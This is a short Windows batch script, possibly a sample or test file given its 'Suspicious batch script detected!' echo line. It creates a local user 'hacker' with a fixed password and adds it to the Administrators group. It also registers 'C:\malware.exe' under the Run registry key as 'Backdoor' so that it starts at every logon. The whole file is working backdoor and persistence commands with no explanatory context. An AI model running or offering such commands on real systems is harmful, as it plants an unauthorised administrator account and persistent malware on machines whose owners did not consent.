@echo off
echo Suspicious batch script detected!
net user hacker Password123 /add
net localgroup administrators hacker /add
reg add "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" /v Backdoor /t REG_SZ /d "C:\malware.exe"
